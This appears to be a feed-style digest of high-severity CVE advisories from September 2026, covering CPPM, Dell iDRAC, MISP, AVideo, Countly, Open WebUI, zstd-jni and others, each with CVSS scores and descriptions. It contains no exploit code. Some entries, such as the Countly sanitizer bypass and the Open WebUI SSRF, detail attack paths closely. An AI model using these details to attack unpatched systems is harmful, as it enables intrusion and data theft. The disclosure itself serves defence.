A vulnerability in the CPPM web interface could allow an authenticated remote attacker to access directory information on a vulnerable system. Successful exploitation could allow an attacker to execute arbitrary commands on the underlying operating system.

### CVE-2026-73769

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2026-09-09T20:20:33.360 |

A vulnerability in the web-based management interface of vulnerable CPPM systems could allow an authenticated remote attacker to achieve remote code execution. Successful exploitation could allow an attacker to execute arbitrary commands on the underlying operating system.

### CVE-2026-23855

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-09T17:17:19.837 |

Dell iDRAC9, 14G versions prior to 7.00.00.184, 15G/16G versions prior to 7.30.10.50, and Dell iDRAC10, 17G versions prior to 1.30.30.50, contain an Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability. A high privileged attacker with remote access could potentially exploit this vulnerability, leading to command injection.

### CVE-2026-88915

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-10T14:17:19.193 |

Affected versions of MISP do not consistently enforce the acting user's authorization when instantiating event templates.


For templates using distribution = 4, the template can specify a sharing_group_id. The instantiation path passed that value into event creation without verifying that the user instantiating the template was actually permitted to use the selected sharing group. The commit notes that Event::_add() only performed its own sharing-group authorization in another code path, leaving template instantiation able to write the identifier directly.


The same instantiation path also attached template-specified tags without checking the user's normal tagging permissions. In addition, it hardcoded local => 0, meaning tags marked local_only could be attached globally and consequently propagate through synchronization or export, contrary to their intended restriction.


The fix adds explicit SharingGroup::canUse() authorization for the acting user, applies the same tag-modification checks used by normal event tagging, and ensures local_only tags are attached locally.

Version affected: ≤2.5.45

### CVE-2026-88873

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-352` |
| Published | 2026-09-10T14:17:15.430 |

WWBN AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 contains a cross-site request forgery vulnerability in view/logArchive.json.php that allows unauthenticated attackers to archive application logs by making GET requests without CSRF token validation. Attackers can craft malicious pages that trigger administrators' browsers to request the endpoint, copying sensitive application logs to a publicly accessible zip file and truncating the live log to remove forensic evidence.

### CVE-2026-88872

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-352` |
| Published | 2026-09-10T14:17:15.243 |

AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 contains a cross-site request forgery vulnerability in the setPassword.json.php endpoint that allows unauthenticated attackers to modify any user's channel password by sending a GET request. Attackers can craft a malicious webpage that, when visited by an authenticated administrator, sets or clears any user's channel password without CSRF token validation.

### CVE-2026-88870

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-352` |
| Published | 2026-09-10T14:17:14.893 |

WWBN AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 contains a cross-site request forgery vulnerability in the LoginControl plugin PGP key endpoints that lack CSRF token validation. Attackers can craft malicious pages with image tags pointing to savePublicKey.json.php to replace a logged-in victim's PGP 2FA public key, causing lockout or enabling account takeover if the attacker knows the password.

### CVE-2026-85545

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `N/A` |
| Published | 2026-09-10T13:20:32.543 |

There is an Vulnerability in some HikCentral Access Control versions. Authenticated low-privilege users can invoke API interfaces that their role is not authorized to access.

### CVE-2026-87961

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-125` |
| Published | 2026-09-10T11:17:07.613 |

ESP32-audioI2S versions 3.4.4 through 4.0.0 contain a heap-based out-of-bounds read vulnerability in the read_ID3_Header function due to a shadowed length parameter in ID3 synchronized-lyrics processing. Attackers can craft malicious MP3 files or HTTP audio streams with oversized frame size declarations to read past allocated buffer boundaries, causing device crashes or exposing adjacent heap memory.

### CVE-2026-87803

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-09-10T10:17:32.610 |

An authorization bypass vulnerability exists in the Countly Server DBViewer due to flawed sub-pipeline detection in the aggregation stage sanitizer. The /o/db aggregation endpoint parses user-controlled aggregation JSON and passes it through a stage sanitizer that determines whether a nested array is a sub-pipeline by checking if every element contains a key present in a hardcoded KNOWN_STAGE_OPERATORS set. If any element contains an unrecognized stage key, such as the undocumented MongoDB-internal $_internalInhibitOptimization, the sanitizer misclassifies the entire branch as a generic array and skips stage-level stripping for all sibling stages. This allows a non-admin user with DBViewer read permission to inject forbidden operators like $lookup inside $facet sub-pipelines, performing cross-collection joins into restricted collections. This leads to unauthorized read access to sensitive data including password-reset tokens (prid), enabling account takeover.

### CVE-2026-78083

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-352` |
| Published | 2026-09-10T10:17:32.020 |

Joomla Extension - joomshaper.com - Missing CSRF Token Verification in Property Booking and Agent Contact Endpoints in SP Property < 4.1.4 - The visitor booking (properties.booking) and agent contact form submission (agents.sendmail) endpoints processed POST requests without verifying Joomla session anti-CSRF tokens.

### CVE-2026-87999

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-09T22:18:48.617 |

Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. Prior to 0.11.1, POST /api/v1/retrieval/process/web and POST /api/v1/retrieval/process/web/search in backend/open_webui/retrieval/web/utils.py treated Python's globally routable address classification as proof that a destination was external. An authenticated user could make an Azure-hosted instance fetch and return content from 168.63.129.16, the Azure platform channel, as well as other reserved ranges that the standard classification did not reject. This issue is fixed in version 0.11.1.

### CVE-2026-87998

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` |
| Weaknesses | `CWE-269;CWE-863` |
| Published | 2026-09-09T22:18:48.460 |

Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.10.0 until 0.11.1, DELETE /api/v1/knowledge/{id}/delete in backend/open_webui/routers/knowledge.py authorized deletion against the knowledge base but then removed its administrator-owned external connection without a separate administrator check or a check for other dependent knowledge bases. A non-administrator with write access to one external knowledge base could delete shared instance configuration and make every other knowledge base using that connection unavailable. This issue is fixed in version 0.11.1.

### CVE-2026-50165

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-284` |
| Published | 2026-09-09T21:17:03.033 |

alf.io is an open source ticket reservation system for conferences, trade shows, workshops, and meetups. An Improper Access Control issue in versions prior to 2.0-M5-2605 allows an organization owner to read system-level configuration secrets through organization/event scoped "single configuration" endpoints. The affected endpoints require organization or event ownership, but they accept an arbitrary configuration key and then return the first matching value from a lookup that includes system-level configuration. As a result, an organization owner can retrieve secrets intended to be administrator-only, including the system API key when it is configured. Version 2.0-M5-2605 fixes the issue.

### CVE-2026-81330

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-319` |
| Published | 2026-09-09T16:17:10.397 |

The C6 ear camera transmits live video to the EarVision Android application over unencrypted UDP streams. The application manifest permits cleartext traffic, and captured network traffic contains reconstructable JPEG or WEBP video frames transmitted over UDP. An attacker within local wireless range may capture and reconstruct the live video stream without transport encryption.

### CVE-2026-79617

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-732` |
| Published | 2026-09-09T15:17:09.543 |

Incorrect Permission Assignment for Critical Resource vulnerability in TÜBİTAK BİLGEM Software Technologies Research Institute Pardus LightDM Greeter allows Exploiting Incorrectly Configured Access Control Security Levels.

This issue affects Pardus LightDM Greeter: before 0.4.15.

### CVE-2026-87877

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-416` |
| Published | 2026-09-09T15:17:28.070 |

zstd-jni versions before 1.5.7-14 fail to validate closed state in setDict, setLongMax, setLevel and setRefMultipleDDicts methods of stream classes. Attackers can call these methods on closed streams to write through freed native pointers, corrupting unrelated objects or crashing the JVM.

### CVE-2026-87825

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-416` |
| Published | 2026-09-09T15:17:27.903 |

zstd-jni before 1.5.7-14 contains a use-after-free vulnerability where streams and contexts hold a dictionary's shared lock only during the load call, allowing the dictionary to be closed while still referenced. Attackers can close a dictionary after associating it with a stream or context, causing subsequent read or write operations to access freed native memory, resulting in silent data corruption or JVM crashes.
